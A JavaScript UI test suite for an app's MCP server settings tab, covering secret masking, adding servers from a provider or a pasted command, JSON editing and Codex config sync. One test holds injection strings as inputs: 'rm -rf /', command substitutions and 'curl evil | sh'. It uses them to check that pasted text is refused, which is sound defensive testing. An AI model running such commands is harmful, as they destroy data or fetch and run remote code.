// Goal: the Settings panel's MCP tab shows the project's `.mcp.json` as cards in plain words (logo tile, name,
// one line, a status that only says what the files show, and the agents each server is available to), adds a
// server from a provider (secrets go to `.env` by name; `.mcp.json` gets a `${NAME}` reference), adds one from a
// pasted line with a preview and a confirm (the line is only read, never run), removes behind the app's own
// confirm, edits a server with its values masked until the eye is pressed, switches to a JSON view that
// validates as it is typed, saves only when valid, never overwrites a file that moved, and warns before edits
// are lost; it shows Codex's state honestly, asks before touching a file outside the project, lists servers only
// in Codex, and tells the person to restart when the running app lacks the channels.
// Method: bundle the real tab with esbuild (the CodeMirror editor is replaced by a textarea, since jsdom has no
// layout), mount it in jsdom over a fake `window.avb` that keeps `.mcp.json`, `.env` and Codex's file in memory
// and answers like main does with the real codecs, then click and type as a person would and read the DOM and
// the stored texts.
const test = require('node:test');
const assert = require('node:assert/strict');
const path = require('node:path');
const fs = require('node:fs');
const crypto = require('node:crypto');
const esbuild = require('esbuild');
const { JSDOM } = require('jsdom');
const { repoPath } = require('../../helpers/sources.js');

const output = repoPath('node_modules/.stacki-test/mcp-panel.cjs');
fs.mkdirSync(path.dirname(output), { recursive: true });
const editorStub = {
  name: 'stub-code-editor',
  setup(build) {
    build.onResolve({ filter: /ui\/CodeEditor$/ }, () => ({ path: 'code-editor-stub', namespace: 'stub' }));
    build.onLoad({ filter: /.*/, namespace: 'stub' }, () => ({
      loader: 'jsx',
      contents:
        "import React from 'react'; export default function CodeEditor({ value, onChange }) { return React.createElement('textarea', { 'data-code-editor': '', value: value ?? '', onChange: (event) => onChange && onChange(event.target.value, 0) }); }",
    }));
  },
};
const built = esbuild.build({
  stdin: {
    contents: [
      "export { default as McpTab } from './src/features/projectSettings/McpTab';",
      "export { default as ProjectSettingsPanel } from './src/features/projectSettings/ProjectSettingsPanel';",
      "export { ConfirmHost } from './src/ui/ConfirmDialog';",
      "export { changeEnvFile, parseEnvFile, serializeEnvFile, envEntries, envInvalidLines } from './shared/properties/envFile';",
      "export { changeMcpJson, scanMcpJson, mcpFileEntries, mcpJsonIssues } from './shared/properties/mcpJson';",
      "export { summarizeMcpServer } from './shared/properties/mcpConfig';",
      "export { scanCodexToml, codexServerEntries, changeCodexToml } from './shared/properties/mcpToml';",
      "export { monogramOf } from './src/ui/ProviderLogo';",
      "export { serverStatus, codexChipOf, configOfDraft, draftOf, copyText } from './src/features/projectSettings/mcpModel';",
    ].join('\n'),
    resolveDir: repoPath('package.json').replace(/package\.json$/, ''),
    loader: 'tsx',
  },
  outfile: output,
  bundle: true,
  platform: 'node',
  format: 'cjs',
  jsx: 'automatic',
  loader: { '.css': 'empty', '.svg': 'empty' },
  external: ['react', 'react-dom', 'react/jsx-runtime'],
  plugins: [editorStub],
  logLevel: 'silent',
});

const dom = new JSDOM('<!doctype html><div id="root"></div>', { url: 'http://localhost/', pretendToBeVisual: true });
require('../../helpers/popupDom').installPopupDOM(dom.window);
global.window = dom.window;
for (const name of ['document', 'navigator', 'HTMLElement', 'Element', 'Node', 'Event', 'KeyboardEvent', 'MouseEvent', 'getComputedStyle']) {
  Object.defineProperty(global, name, { value: dom.window[name], configurable: true, writable: true });
}
dom.window.Element.prototype.scrollIntoView = function scrollIntoView() {};
global.IS_REACT_ACT_ENVIRONMENT = true;

const SECRET = 'sk-literal-secret-value';
const TOKEN = 'ghp_typed_token_value';
const React = require('react');
const { act } = React;
const { createRoot } = require('react-dom/client');
let panel;

// The files as main would hold them.
let mcpText; // undefined: no .mcp.json
let envText;
let codexText; // undefined: no Codex file
let calls;
const digest = (value) =>
  crypto
    .createHash('sha256')
    .update(value ?? '')
    .digest('hex');
const failure = (code) => ({ ok: false, error: { code, message: 'm' } });

function mcpListing() {
  const scanned = panel.scanMcpJson(mcpText ?? '');
  if (!scanned.ok) {
    return failure('unreadable');
  }
  const servers = panel
    .mcpFileEntries(scanned.value)
    .map((entry) =>
      entry.status === 'server'
        ? { name: entry.name, status: 'server', summary: panel.summarizeMcpServer(entry.config) }
        : { name: entry.name, status: 'invalid', problem: entry.problem },
    );
  return { ok: true, value: { revision: digest(mcpText), exists: mcpText !== undefined, servers } };
}
function configOf(text, name) {
  const entry = panel.mcpFileEntries(panel.scanMcpJson(text ?? '').value).find((candidate) => candidate.name === name);
  return entry !== undefined && entry.status === 'server' ? entry.config : undefined;
}
function envListing() {
  const parsed = panel.parseEnvFile(envText ?? '');
  const entries = panel.envEntries(parsed.value).map(({ index, name, duplicate, multiline }) => ({ index, name, duplicate, multiline }));
  return { revision: digest(envText), exists: envText !== undefined, entries, invalidLines: panel.envInvalidLines(parsed.value), ignore: 'ignored' };
}
function codexState() {
  if (codexText === undefined) {
    return { state: 'missing' };
  }
  const scanned = panel.scanCodexToml(codexText);
  const servers = panel
    .codexServerEntries(scanned.value)
    .map((entry) =>
      entry.config === undefined
        ? { name: entry.name, status: 'invalid', problem: { code: 'missing-target', path: entry.name } }
        : { name: entry.name, status: 'server', summary: panel.summarizeMcpServer(entry.config) },
    );
  return { state: 'ready', revision: digest(codexText), servers };
}
function installMain() {
  window.avb = {
    readMcp: async () => mcpListing(),
    readMcpText: async () => ({ ok: true, value: { revision: digest(mcpText), exists: mcpText !== undefined, text: mcpText ?? '' } }),
    revealMcpServer: async ({ revision, name }) => {
      calls.push(['reveal', name]);
      const config = revision === digest(mcpText) ? configOf(mcpText, name) : undefined;
      return config === undefined ? failure('not-found') : { ok: true, value: config };
    },
    applyMcpChange: async ({ revision, change }) => {
      calls.push(['apply', change]);
      if (revision !== digest(mcpText)) {
        return failure('changed');
      }
      const next = panel.changeMcpJson(mcpText ?? '', change.kind === 'remove' ? change : { kind: 'upsert', name: change.name, config: change.config });
      if (!next.ok) {
        return failure(next.error);
      }
      mcpText = next.value;
      return mcpListing();
    },
    saveMcpText: async ({ revision, text }) => {
      calls.push(['save', text]);
      if (revision !== digest(mcpText)) {
        return failure('changed');
      }
      mcpText = text;
      return mcpListing();
    },
    readMcpCodex: async () => codexState(),
    revealMcpCodexServer: async ({ name }) => {
      const entry = panel.codexServerEntries(panel.scanCodexToml(codexText).value).find((candidate) => candidate.name === name);
      return entry?.config === undefined ? failure('unmappable') : { ok: true, value: entry.config };
    },
    applyMcpCodexChange: async ({ revision, projectRevision, change }) => {
      calls.push(['codex', change]);
      if (revision !== digest(codexText) || projectRevision !== digest(mcpText)) {
        return failure('changed');
      }
      const edit = change.kind === 'remove' ? change : { kind: 'put', name: change.name, config: configOf(mcpText, change.name) };
      const next = panel.changeCodexToml(codexText, edit);
      if (!next.ok) {
        return failure(next.error.code === 'unmappable' ? 'unmappable' : 'codex-unsupported');
      }
      codexText = next.value;
      return { ok: true, value: codexState() };
    },
    listSecrets: async () => ({ ok: true, value: envListing() }),
    applySecretsChange: async ({ revision, change }) => {
      calls.push(['secret', change.kind === 'add' ? change.name : change.kind]);
      if (revision !== digest(envText)) {
        return failure('changed');
      }
      if (change.kind === 'create') {
        envText ??= '';
        return { ok: true, value: envListing() };
      }
      const next = panel.changeEnvFile(panel.parseEnvFile(envText ?? '').value, change);
      envText = panel.serializeEnvFile(next.value);
      return { ok: true, value: envListing() };
    },
  };
}

const settle = () => act(async () => new Promise((resolve) => setTimeout(resolve, 0)));
const settleAll = async () => {
  await settle();
  await settle();
  await settle();
};
const click = async (element) => {
  assert.ok(element, 'the control exists');
  await act(async () => element.click());
  await settleAll();
};
const type = async (element, value) => {
  assert.ok(element, 'the field exists');
  const setter = Object.getOwnPropertyDescriptor(Object.getPrototypeOf(element), 'value').set;
  await act(async () => {
    setter.call(element, value);
    element.dispatchEvent(new window.Event(element.tagName === 'TEXTAREA' ? 'change' : 'input', { bubbles: true }));
    element.dispatchEvent(new window.Event('input', { bubbles: true }));
  });
  await settleAll();
};
const byLabel = (label) => document.querySelector(`[aria-label="${label}"]`);
const button = (label) => [...document.querySelectorAll('button')].find((candidate) => candidate.textContent.trim() === label);
const menuItem = (label) => [...document.querySelectorAll('[role="menuitem"]')].find((candidate) => candidate.textContent.trim() === label);
const cards = () => [...document.querySelectorAll('.mcp-card')];
const cardOf = (name) => cards().find((card) => card.querySelector('.mcp-card-name')?.textContent === name);
const pageText = () => document.body.textContent;

let root;
async function mount(projectPath = '/project') {
  root = createRoot(document.getElementById('root'));
  await act(async () =>
    root.render(React.createElement(React.Fragment, {}, React.createElement(panel.McpTab, { projectPath }), React.createElement(panel.ConfirmHost))),
  );
  await settleAll();
}
async function unmount() {
  await act(async () => root.unmount());
  document.body.querySelectorAll('dialog, .dd-popup, .more-menu').forEach((node) => node.remove());
}
function reset({ mcp, env, codex } = {}) {
  mcpText = mcp;
  envText = env;
  codexText = codex;
  calls = [];
  installMain();
}
const FILE = `{
  "mcpServers": {
    "Sanity": { "type": "http", "url": "https://mcp.sanity.io" },
    "local": { "type": "stdio", "command": "npx", "args": ["-y", "pkg"], "env": { "API_KEY": "\${API_KEY}", "PLAIN": "${SECRET}" } }
  }
}
`;
const CODEX = '# codex\nmodel = "x"\n\n[mcp_servers.only_codex]\ncommand = "node"\nargs = ["a"]\n\n[features]\nx = true\n';

test.before(async () => {
  await built;
  panel = require(output);
});

test('cards show the mark, name, one line in words, a status from the files, and the agents; no literal value is in the page', async () => {
  reset({ mcp: FILE, env: 'OTHER=1\n' });
  await mount();
  assert.deepEqual(
    cards().map((card) => card.querySelector('.mcp-card-name').textContent),
    ['Sanity', 'local'],
  );
  const sanity = cardOf('Sanity');
  assert.ok(sanity.textContent.includes('Remote server · mcp.sanity.io'));
  assert.ok(sanity.querySelector('.provider-logo svg[aria-hidden="true"]'), 'a brand mark');
  assert.ok(cardOf('local').querySelector('.provider-logo.monogram'), 'an unknown server gets a monogram tile');
  assert.ok(sanity.querySelector('.mcp-status-configured'));
  const local = cardOf('local');
  assert.ok(local.textContent.includes('Runs a command · npx'));
  assert.ok(local.textContent.includes('Needs secrets missing from .env (1)'));
  assert.ok(local.querySelector('.mcp-status-needs-secrets'));
  assert.ok(sanity.textContent.includes('Claude Code'));
  assert.ok(!pageText().includes(SECRET), 'a literal value is never in the page');
  assert.ok(!document.body.innerHTML.includes(SECRET));
  await unmount();
});

test('once .env has the secret the card says it uses it, and a project with no file is the ordinary empty state', async () => {
  reset({ mcp: FILE, env: 'API_KEY=abc\n' });
  await mount();
  assert.ok(cardOf('local').textContent.includes('Uses secrets from .env (1)'));
  assert.ok(cardOf('local').querySelector('.mcp-status-configured'));
  await unmount();
  reset({});
  await mount();
  assert.ok(pageText().includes('No MCP servers yet'));
  assert.equal(cards().length, 0);
  await unmount();
});

test('adding from a provider stores the secret in .env by name and writes only a reference to .mcp.json', async () => {
  reset({ mcp: '{\n  "mcpServers": {}\n}\n' });
  await mount();
  await click(document.querySelector('.dd-trigger'));
  const option = [...document.querySelectorAll('.dd-option')].find((candidate) => candidate.textContent.includes('GitHub'));
  assert.ok(option, 'the provider list has GitHub');
  assert.ok(option.querySelector('.provider-logo'), 'rows carry the tile');
  await click(option);
  const secret = byLabel('Secret: GITHUB_PERSONAL_ACCESS_TOKEN');
  assert.equal(secret.type, 'password', 'the secret field is masked');
  await click(button('Add'));
  assert.ok(pageText().includes('A value is required.'));
  assert.deepEqual(
    calls.filter((call) => call[0] !== 'reveal'),
    [],
    'nothing was written',
  );
  await type(secret, TOKEN);
  await click(button('Add'));
  assert.ok(envText.includes(`GITHUB_PERSONAL_ACCESS_TOKEN=${TOKEN}`), 'the value went to .env');
  assert.ok(mcpText.includes('Bearer ${GITHUB_PERSONAL_ACCESS_TOKEN}'));
  assert.ok(!mcpText.includes(TOKEN), '.mcp.json holds the name only');
  assert.ok(cardOf('GitHub'), 'the new server shows as a card');
  assert.ok(!document.body.innerHTML.includes(TOKEN));
  await unmount();
});

test('a pasted line is previewed and nothing is written until the person confirms', async () => {
  reset({ mcp: '{}' });
  await mount();
  const input = byLabel('Paste a command') ?? document.getElementById('mcp-paste');
  await type(input, 'claude mcp add Sanity -t http https://mcp.sanity.io --scope user');
  assert.ok(pageText().includes('Will add Sanity · Remote server · https://mcp.sanity.io'));
  assert.ok(pageText().includes('User scope'), 'a user scope is said to become a project entry');
  assert.equal(mcpText, '{}', 'nothing is written by the preview');
  await click(button('Add'));
  assert.ok(cardOf('Sanity'));
  assert.deepEqual(JSON.parse(mcpText), { mcpServers: { Sanity: { type: 'http', url: 'https://mcp.sanity.io' } } });
  assert.equal(document.getElementById('mcp-paste').value, '', 'the field is cleared after adding');
  await unmount();
});

test('a pasted line with a literal variable moves the value to .env and keeps only a reference', async () => {
  reset({ mcp: '{}' });
  await mount();
  await type(document.getElementById('mcp-paste'), `claude mcp add db -e DB_KEY=${SECRET} -- npx -y pkg`);
  assert.ok(pageText().includes('Saved to .env: DB_KEY'));
  assert.ok(!pageText().includes(SECRET), 'the preview never prints the value');
  await click(button('Add'));
  assert.ok(envText.includes(`DB_KEY=${SECRET}`));
  assert.ok(mcpText.includes('${DB_KEY}') && !mcpText.includes(SECRET));
  await unmount();
});

test('pasted text is inert: operators, substitutions and unknown options are refused in words and nothing is written', async () => {
  reset({ mcp: '{}' });
  await mount();
  for (const line of [
    'claude mcp add x -- npx pkg; rm -rf /',
    'claude mcp add x -- npx $(whoami)',
    'claude mcp add x -- npx `id`',
    'claude mcp add x --frobnicate y -- npx pkg',
    'claude mcp add x -- npx a && curl evil | sh',
  ]) {
    await type(document.getElementById('mcp-paste'), line);
    assert.ok(document.querySelector('.secrets-problem'), `a message for: ${line}`);
    assert.equal(button('Add').disabled, true, 'no confirm for a refused line');
  }
  assert.ok(pageText().includes('Only one plain command is read'));
  assert.equal(mcpText, '{}');
  assert.deepEqual(calls, []);
  await unmount();
});

test('removing asks in the app’s own dialog: cancel keeps the server, confirm removes only it', async () => {
  reset({ mcp: FILE, env: '' });
  await mount();
  await click(byLabel('Options for Sanity'));
  await click(menuItem('Remove'));
  assert.ok(document.querySelector('dialog')?.textContent.includes('Remove Sanity?'));
  await click(button('Cancel'));
  assert.equal(mcpText, FILE);
  await click(byLabel('Options for Sanity'));
  await click(menuItem('Remove'));
  await click(document.querySelector('dialog button.danger') ?? button('Remove'));
  assert.ok(!mcpText.includes('"Sanity"') && mcpText.includes('"local"'));
  assert.deepEqual(
    cards().map((card) => card.querySelector('.mcp-card-name').textContent),
    ['local'],
  );
  await unmount();
});

test('editing masks values until the eye, shows references as written, and saves only that entry', async () => {
  reset({ mcp: FILE, env: 'API_KEY=1\n' });
  await mount();
  await click(byLabel('Options for local'));
  await click(menuItem('Edit'));
  const values = [...document.querySelectorAll('.mcp-pair input[aria-label="Value"]')];
  assert.deepEqual(
    values.map((input) => input.type),
    ['text', 'password'],
    'the reference is shown, the literal is masked',
  );
  assert.equal(values[1].value, SECRET, 'the value is in the field only after Edit was chosen');
  await click(byLabel('Show PLAIN'));
  assert.equal(document.querySelectorAll('.mcp-pair input[aria-label="Value"]')[1].type, 'text');
  await type(document.querySelector('.mcp-form textarea'), '-y\nother-pkg');
  await click(button('Save'));
  assert.equal(mcpText, FILE.replace('"args": ["-y", "pkg"]', '"args": [\n      "-y",\n      "other-pkg"\n    ]'), 'only the args of that one entry changed');
  await unmount();
});

test('an invalid edit shows the reason beside the field and writes nothing', async () => {
  reset({ mcp: FILE, env: '' });
  await mount();
  await click(byLabel('Options for Sanity'));
  await click(menuItem('Edit'));
  const url = document.querySelector('.mcp-form input.secrets-input');
  await type(url, 'ftp://nope');
  await click(button('Save'));
  assert.ok(pageText().includes('Enter a valid http or https address'));
  assert.equal(mcpText, FILE);
  await unmount();
});

test('Copy config puts the server on the clipboard with literal values hidden', async () => {
  reset({ mcp: FILE, env: '' });
  let copied;
  Object.defineProperty(dom.window.navigator, 'clipboard', { value: { writeText: async (value) => void (copied = value) }, configurable: true });
  await mount();
  await click(byLabel('Options for local'));
  await click(menuItem('Copy config'));
  assert.ok(copied.includes('"local"') && copied.includes('${API_KEY}'));
  assert.ok(!copied.includes(SECRET) && copied.includes('***'));
  assert.ok(pageText().includes('Secrets are hidden'));
  await unmount();
});

test('the JSON view validates as it is typed, saves only when valid, and warns before edits are lost', async () => {
  reset({ mcp: FILE, env: '' });
  await mount();
  await click(button('JSON'));
  const editor = document.querySelector('[data-code-editor]');
  assert.equal(editor.value, FILE, 'the whole file, as written');
  const saveButton = () => button('Save');
  assert.equal(saveButton().disabled, true, 'nothing to save yet');
  await type(editor, '{\n  "mcpServers": {\n    "a": {"command": "x",}\n  }\n}');
  assert.ok(pageText().includes('Line 3, column'), 'a position for a syntax error');
  assert.equal(saveButton().disabled, true);
  await type(editor, '{"mcpServers":{"a":{"type":"http","url":"ftp://x"}}}');
  assert.ok(pageText().includes('Enter a valid http or https address'), 'a schema problem by path');
  assert.equal(saveButton().disabled, true);
  await click(button('Servers'));
  assert.ok(document.querySelector('dialog')?.textContent.includes('Discard your JSON changes?'), 'the app’s own dialog warns');
  await click(button('Keep editing'));
  assert.ok(document.querySelector('[data-code-editor]'), 'still in the JSON view');
  const good = '{"mcpServers":{"a":{"command":"x"}}}';
  await type(document.querySelector('[data-code-editor]'), good);
  assert.equal(saveButton().disabled, false);
  await act(async () => document.querySelector('.mcp-json').dispatchEvent(new window.KeyboardEvent('keydown', { key: 's', metaKey: true, bubbles: true })));
  await settleAll();
  assert.equal(mcpText, good, 'Cmd+S saved');
  await click(button('Servers'));
  assert.deepEqual(
    cards().map((card) => card.querySelector('.mcp-card-name').textContent),
    ['a'],
  );
  await unmount();
});

test('Revert drops the edits, and a file that changed on disk is not overwritten', async () => {
  reset({ mcp: FILE, env: '' });
  await mount();
  await click(button('JSON'));
  await type(document.querySelector('[data-code-editor]'), '{"mcpServers":{}}');
  await click(button('Revert'));
  assert.equal(document.querySelector('[data-code-editor]').value, FILE);
  await type(document.querySelector('[data-code-editor]'), '{"mcpServers":{"mine":{"command":"x"}}}');
  const outside = '{"mcpServers":{"theirs":{"command":"y"}}}';
  mcpText = outside;
  await act(async () => window.dispatchEvent(new window.Event('focus')));
  await settleAll();
  assert.ok(pageText().includes('The file changed on disk.'));
  assert.equal(button('Save').disabled, true, 'Save is off while the file moved');
  assert.equal(mcpText, outside);
  await click(button('Reload'));
  assert.equal(document.querySelector('[data-code-editor]').value, outside);
  await unmount();
});

test('a file that changed behind the cards is refused with Reload, and nothing is overwritten', async () => {
  reset({ mcp: FILE, env: '' });
  await mount();
  mcpText = FILE.replace('mcp.sanity.io', 'elsewhere.example');
  const outside = mcpText;
  await click(byLabel('Options for local'));
  await click(menuItem('Remove'));
  await click(document.querySelector('dialog button.danger') ?? button('Remove'));
  assert.ok(pageText().includes('The file changed on disk. Reload to see the latest.'));
  assert.equal(mcpText, outside);
  await click(button('Reload'));
  assert.ok(cardOf('Sanity').textContent.includes('elsewhere.example'));
  await unmount();
});

test('Codex: with no Codex file the chip says so plainly and nothing breaks', async () => {
  reset({ mcp: FILE, env: '' });
  await mount();
  assert.ok(cardOf('Sanity').textContent.includes('Codex not found'));
  assert.ok(cardOf('Sanity').querySelector('.mcp-chip-button') === null, 'a muted note, not a button');
  await unmount();
});

test('Codex: the chip adds a server only after a dialog that says the file is outside the project, and removes it the same way', async () => {
  reset({ mcp: FILE, env: '', codex: CODEX });
  await mount();
  const chip = () => cardOf('Sanity').querySelector('.mcp-chip-button');
  assert.equal(chip().textContent, 'Codex: off');
  await click(chip());
  const dialog = document.querySelector('dialog');
  assert.ok(dialog.textContent.includes('~/.codex/config.toml') && dialog.textContent.includes('shared by all projects'));
  await click(button('Cancel'));
  assert.deepEqual(
    calls.filter((call) => call[0] === 'codex'),
    [],
  );
  assert.equal(codexText, CODEX);
  await click(chip());
  await click(button('Add to Codex'));
  assert.ok(codexText.startsWith(CODEX), 'the rest of the Codex file is untouched');
  assert.ok(codexText.includes('[mcp_servers.Sanity]'));
  assert.equal(chip().textContent, 'Codex: on');
  await click(chip());
  await click(button('Remove from Codex'));
  assert.equal(codexText, CODEX);
  await unmount();
});

test('Codex: servers only in Codex are listed and brought into the project on request', async () => {
  reset({ mcp: FILE, env: '', codex: CODEX });
  await mount();
  assert.ok(pageText().includes('Only in Codex'));
  assert.equal(cardOf('only_codex'), undefined, 'the Codex-only list starts collapsed');
  await click(document.querySelector('.mcp-disclosure'));
  assert.ok(cardOf('only_codex'));
  await click(button('Add to project'));
  assert.ok(document.querySelector('dialog')?.textContent.includes('Add only_codex to this project?'));
  await click(document.querySelector('dialog button.primary') ?? button('Add to project'));
  assert.ok(mcpText.includes('"only_codex"'));
  await unmount();
});

test('a running app that lacks the channels says to restart Stacki, with no reload offered', async () => {
  reset({ mcp: FILE });
  delete window.avb.readMcp;
  await mount();
  assert.ok(pageText().includes('Restart Stacki'));
  assert.equal(button('Reload'), undefined);
  await unmount();
  reset({ mcp: FILE });
  window.avb.readMcp = async () => {
    throw new Error("Error invoking remote method 'mcp:read': Error: No handler registered for 'mcp:read'");
  };
  await mount();
  assert.ok(pageText().includes('Restart Stacki'));
  await unmount();
});

test('a file with a mistake says so and offers the JSON view', async () => {
  reset({ mcp: '{"mcpServers": ' });
  await mount();
  assert.ok(pageText().includes('Fix it in the JSON view'));
  await click(button('Open the JSON view'));
  assert.ok(document.querySelector('[data-code-editor]'));
  await unmount();
});

test('the panel lists MCP after Secrets', async () => {
  reset({ mcp: '{}', env: '' });
  root = createRoot(document.getElementById('root'));
  await act(async () =>
    root.render(
      React.createElement(
        React.Fragment,
        {},
        React.createElement(panel.ProjectSettingsPanel, { projectPath: '/project' }),
        React.createElement(panel.ConfirmHost),
      ),
    ),
  );
  await settleAll();
  const tabs = [...document.querySelectorAll('.project-settings-tab')].map((tab) => tab.textContent.trim());
  assert.deepEqual(tabs, ['Secrets', 'MCP']);
  await click([...document.querySelectorAll('.project-settings-tab')][1]);
  assert.ok(pageText().includes('MCP servers'));
  await unmount();
});

test('model: a mark is the same for the same name, a status says only what the files show, and drafts parse like main', () => {
  assert.deepEqual(panel.monogramOf('Sanity'), panel.monogramOf(' sanity '));
  assert.notDeepEqual(panel.monogramOf('Sanity').hue, panel.monogramOf('Figma').hue);
  assert.equal(panel.monogramOf('').letter, '?');
  const server = { name: 'a', status: 'server', summary: { transport: 'http', host: 'x', headers: [], secretNames: ['K'] } };
  assert.equal(panel.serverStatus(server, new Set(['K'])), 'configured');
  assert.equal(panel.serverStatus(server, new Set()), 'needs-secrets');
  assert.equal(panel.serverStatus(server, undefined), 'configured', 'no claim when .env cannot be read');
  assert.equal(panel.serverStatus({ name: 'a', status: 'invalid', problem: { code: 'bad-url', path: '' } }, undefined), 'invalid');
  assert.deepEqual(panel.codexChipOf(undefined, 'a'), { kind: 'missing' });
  assert.deepEqual(panel.codexChipOf({ state: 'unavailable', code: 'denied' }, 'a'), { kind: 'unreadable' });
  assert.deepEqual(panel.codexChipOf({ state: 'unavailable', code: 'codex-unsupported' }, 'a'), { kind: 'unsupported' });
  const draft = panel.draftOf({ transport: 'stdio', command: 'npx', args: ['-y', 'p'], env: [{ name: 'A', value: 'b' }] });
  assert.deepEqual(panel.configOfDraft(draft), {
    ok: true,
    value: { transport: 'stdio', command: 'npx', args: ['-y', 'p'], env: [{ name: 'A', value: 'b' }] },
  });
  assert.deepEqual(panel.configOfDraft({ ...draft, command: ' ' }), { ok: false, code: 'missing-target', field: 'command' });
  assert.deepEqual(panel.configOfDraft({ ...draft, pairs: [{ name: 'bad name', value: 'x' }] }), { ok: false, code: 'bad-name', field: 'pairs' });
  assert.ok(!panel.copyText('a', { transport: 'stdio', command: 'x', args: [], env: [{ name: 'K', value: SECRET }] }).includes(SECRET));
});

test('the JSON view of a missing file starts from a ready-to-save starter', async () => {
  reset({});
  await mount();
  await click(button('JSON'));
  assert.equal(document.querySelector('[data-code-editor]').value, '{\n  "mcpServers": {}\n}\n');
  assert.equal(button('Save').disabled, false, 'Save is on for the starter');
  await click(button('Save'));
  assert.equal(mcpText, '{\n  "mcpServers": {}\n}\n');
  await unmount();
});
